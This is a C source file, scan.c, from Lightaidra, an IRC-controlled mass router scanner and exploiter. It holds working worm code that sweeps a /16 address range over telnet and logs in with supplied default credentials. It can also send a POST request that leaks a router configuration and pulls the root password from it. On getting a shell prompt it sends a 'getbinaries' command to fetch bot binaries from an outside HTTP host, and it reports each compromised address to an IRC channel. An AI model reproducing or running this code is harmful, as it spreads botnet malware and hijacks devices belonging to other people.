/*
 * scan.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

int sockwrite(int sd, const char *fmt, ...);
int cmd_advscan_getpass(sock_t *scan_sp);
void *scan_address(scan_data_t *scan_data); 
int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req,
            unsigned short type); 
int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req,
             unsigned short type); 

/* cmd_scan_central(sock_t *, requests_t *, unsigned short) */ 
/* start scanner with vuln type.  */ 
void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
    unsigned short a, b, c;
    int i, x;
    pthread_t pthds[maxthreads];
    scan_data_t scan_data[maxthreads];

    total = 0;
    founds = 0;
    c = 0;

    sleep(2);
    remove(result_file);
    resfd = fopen(result_file, "a+");
    
    if (resfd == NULL) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to open: %s\n", channel, result_file);
        sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
        exit(EXIT_FAILURE);
    }

    memset(hosts, 0, sizeof hosts);
    
    for (a = 0; a <= 255; a++) {
        for (b = 0; b <= 255; b++) {
            snprintf(hosts[c], sizeof(hosts[c]), "%s.%s.%d.%d", req->rcv_sb, req->rcv_sc, a, b);
            c++;
        }
    }

    for (i = 0; i <= maxhosts;) {
        if (strlen(hosts[i]) < 7) break;

        for (x = 0; x < maxthreads; x++, i++) {
            if (strlen(hosts[i]) < 7) break;

            memset(scan_data[x].hostname, 0, sizeof(scan_data[x].hostname));
            snprintf(scan_data[x].hostname, 31, "%s", hosts[i]);

            if (pthread_create(&pthds[x], NULL, (void *)&scan_address, (scan_data_t *) & scan_data[x]) != 0) {
                if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                goto crash;
            }
        }

        for (x = 0; x < maxthreads; x++) {
            if (strlen(hosts[i]) < 7) break;
            
            if (pthread_join(pthds[x], NULL) != 0) {
                if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                goto crash;
            }
        }
    }

crash:

    if (!total) {
        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanner completed, founds %d ips..\n",  channel, total);
        exit(EXIT_SUCCESS);
    } 
    else {
        if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[advscan] scanner completed, founds %d ips, pwning time..\n",  channel, total);
    }

    if ((resfd = fopen(result_file, "r+")) == NULL) {
        sockwrite(sp->sockfd, "PRIVMSG %s :[error] unable to open: %s\n", channel, result_file);
        sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
        exit(EXIT_FAILURE);
    }

    while (fgets(resbuf, sizeof(resbuf) - 1, resfd) != NULL) {
        sscanf(resbuf, "%16s", restag);
    
        if (cmd_advscan_control(restag, sp, req, type) == 0) {
            if (all_messages) {
                if (type == 1) {
                    sockwrite(sp->sockfd, "PRIVMSG %s :[vuln] address: %s (user:%s pass:%s) possible vuln with default password!\n", 
                    channel, restag, req->rcv_sd, req->rcv_se);
                } 
                else if (type == 2) {
                    strncpy(psw_y, psw_x, strlen(psw_x) - 2);
                    sockwrite(sp->sockfd, "PRIVMSG %s :[vuln] address: %s (user:root pass:%s) possible vuln with config file post request!\n", 
                    channel, restag, psw_y);
                }
            }
        }

        memset(restag, 0, sizeof restag);
    }

    fclose(resfd);
    sockwrite(sp->sockfd, "QUOTE ZOMBIE\n");
    
    exit(EXIT_FAILURE);
}

/* scan_address(scan_data_t *) */ 
/* start addresses scanner.  */ 
void *scan_address(scan_data_t *scan_data) {
    FILE *rfd;
    int retv, flags;
    fd_set rd, wr;
    char temp[128];
    sock_t *scan_isp;

    scan_isp = (sock_t *) malloc(sizeof(sock_t));

    if (!(scan_isp->sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP))) pthread_exit(NULL);

    memset(temp, 0, sizeof temp);
    memset(&scan_isp->sockadr, 0, sizeof scan_isp->sockadr);
    scan_isp->sockadr.sin_port = htons(telnet_port);
    scan_isp->sockadr.sin_family = AF_INET;

    timeout_value = 1;
    tm.tv_sec = timeout_value;
    tm.tv_usec = 500000;

    if (!inet_aton((const char *)scan_data->hostname, (struct in_addr *)&scan_isp->sockadr.sin_addr)) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    flags = fcntl(scan_isp->sockfd, F_GETFL, 0);
    
    if (fcntl(scan_isp->sockfd, F_SETFL, O_NONBLOCK) == false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    if (connect(scan_isp->sockfd, (struct sockaddr *)&scan_isp->sockadr, sizeof(scan_isp->sockadr)) == -1) {
        if (errno != EINPROGRESS) {
            close(scan_isp->sockfd);
            free(scan_isp);
            pthread_exit(NULL);
        }
    }

    FD_SET(scan_isp->sockfd, &wr);
    
    if (!(retv = select(scan_isp->sockfd + 1, NULL, &wr, NULL, &tm))) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else if (retv == false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    if (recv(scan_isp->sockfd, temp, sizeof(temp) - 1, 0) != false) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    if (errno != EWOULDBLOCK) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    }

    FD_SET(scan_isp->sockfd, &rd);
    
    if (!(retv = select(scan_isp->sockfd + 1, &rd, NULL, NULL, &tm))) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else if (retv == -1) {
        close(scan_isp->sockfd);
        free(scan_isp);
        pthread_exit(NULL);
    } 
    else {
        if ((fcntl(scan_isp->sockfd, F_SETFL, flags)) == false) {
            close(scan_isp->sockfd);
            free(scan_isp);
            pthread_exit(NULL);
        }

        if (recv(scan_isp->sockfd, temp, sizeof(temp) - 1, 0) != false) {
            rfd = fopen(result_file, "a+");
            
            if (rfd != NULL) {
                fprintf(rfd, "%s\n", scan_data->hostname);
                fflush(rfd);
                fclose(rfd);
                total++;
            }
        }
    }

    close(scan_isp->sockfd);
    free(scan_isp);

    pthread_exit(NULL);
}

/* __alarm() */ 
/* for socket timeout. */ 
void __alarm() {
    close(scan_sp->sockfd);
    return;
}

/* cmd_advscan_control(char *, sock_t *, requests_t *) */ 
/* advance scanner init.  */ 
int cmd_advscan_control(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
    if (type == 1) {
        if (cmd_advscan_join(addr, sp, req, 1) == true) {
            founds++;
            return EXIT_SUCCESS;
        } 
        else {
            return EXIT_FAILURE;
        }
    } 
    else if (type == 2) {
        scan_sp = (sock_t *) malloc(sizeof(sock_t));
        scan_sp->sockhs = gethostbyname(addr);
        scan_sp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
        scan_sp->sockadr.sin_family = AF_INET;
        scan_sp->sockadr.sin_port = htons(http_port);
        scan_sp->sockadr.sin_addr = *((struct in_addr *)scan_sp->sockhs->h_addr);
        memset(scan_sp->sockadr.sin_zero, '\0', sizeof scan_sp->sockadr.sin_zero);

        timeout_value = 1;
        tm.tv_sec = timeout_value;
        tm.tv_usec = 500000;

        signal(SIGALRM, __alarm);
        alarm(timeout_value);

        if (connect(scan_sp->sockfd, (struct sockaddr *)&scan_sp->sockadr, sizeof scan_sp->sockadr) == false) {
            alarm(0);
            signal(SIGALRM, SIG_DFL);
            free(scan_sp);
            return EXIT_FAILURE;
        }

        if (cmd_advscan_getpass(scan_sp) == true) {
            close(scan_sp->sockfd);
            free(scan_sp);
        
            if (cmd_advscan_join(addr, sp, req, 2) == true) {
                founds++;
                return EXIT_SUCCESS;
            } 
            else {
                return EXIT_FAILURE;
            }
        }
    }

    close(scan_sp->sockfd);
    free(scan_sp);

    return EXIT_FAILURE;
}

/* cmd_advscan_getpass(sock_t *) */ 
/* advance scanner password finder. */ 
int cmd_advscan_getpass(sock_t *scan_sp) {
    char temp[801];
    char *one, *two;

    if (sockwrite(scan_sp->sockfd, post_request) == false) return EXIT_FAILURE;

    recv(scan_sp->sockfd, temp, 100, 0);
    recv(scan_sp->sockfd, temp, 800, 0);
    one = strtok(temp, "<");

    while (one != NULL) {
        if (strstr(one, "password>")) {
            two = strtok(one, ">");
            
            while (two != NULL) {
                if (strcmp(two, "password") != true) {
                    snprintf(psw_x, strlen(two) + 3, "%s\r\n", two);
                    return EXIT_SUCCESS;
                }

                two = strtok(NULL, ">");
            }
        }

        one = strtok(NULL, "<");
    }

    return EXIT_FAILURE;
}

/* cmd_advscan_join(char *, sock_t *, requests_t *) */ 
/* advance scanner (router validate control).  */ 
int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req, unsigned short type) {
    unsigned short e = 0;

    scan_sp = (sock_t *) malloc(sizeof(sock_t));
    scan_sp->sockhs = gethostbyname(addr);
    scan_sp->sockfd = socket(AF_INET, SOCK_STREAM, 0);
    scan_sp->sockadr.sin_family = AF_INET;
    scan_sp->sockadr.sin_port = htons(telnet_port);

    scan_sp->sockadr.sin_addr = *((struct in_addr *)scan_sp->sockhs->h_addr);
    memset(scan_sp->sockadr.sin_zero, '\0', sizeof scan_sp->sockadr.sin_zero);

    timeout_value = 2;
    tm.tv_sec = timeout_value;
    tm.tv_usec = 500000;

    setsockopt(scan_sp->sockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&tm,sizeof(struct timeval));

    /* ignore ++ KILLED BY SIGPIPE ++ */
    signal(SIGPIPE, SIG_IGN);

    signal(SIGALRM, __alarm);
    alarm(timeout_value);

    if (connect(scan_sp->sockfd, (struct sockaddr *)&scan_sp->sockadr, sizeof scan_sp->sockadr) == false) {
        alarm(0);
        signal(SIGALRM, SIG_DFL);
        free(scan_sp);
        return EXIT_FAILURE;
    }

    if (type == 1) {
        if (sockwrite(scan_sp->sockfd, "%s\r\n", req->rcv_sd) == false) e++;
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);

        if (sockwrite(scan_sp->sockfd, "%s\r\n", req->rcv_se) == false) e++;
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
    } 
    else if (type == 2) {
        if (send(scan_sp->sockfd, "root\r\n", strlen("root\r\n"), MSG_NOSIGNAL) == false) e++;
    
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        send(scan_sp->sockfd, psw_x, strlen(psw_x), MSG_NOSIGNAL);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
    }

    if (e) {
        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_FAILURE;
    }

    memset(__netbuf, 0, sizeof __netbuf);
    recv_bytes = recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);

    if (recv_bytes == -1) {
        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_FAILURE;
    }
    
    __netbuf[recv_bytes] = 0;

    if (strchr(__netbuf, '#') != NULL || strchr(__netbuf, '$') != NULL) {
        sockwrite(scan_sp->sockfd, getbinaries, reference_http);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        recv(scan_sp->sockfd, __netbuf, sizebuf - 1, 0);
        sleep(3);

        close(scan_sp->sockfd);
        free(scan_sp);
        return EXIT_SUCCESS;
    }

    close(scan_sp->sockfd);
    free(scan_sp);

    return EXIT_FAILURE;
}
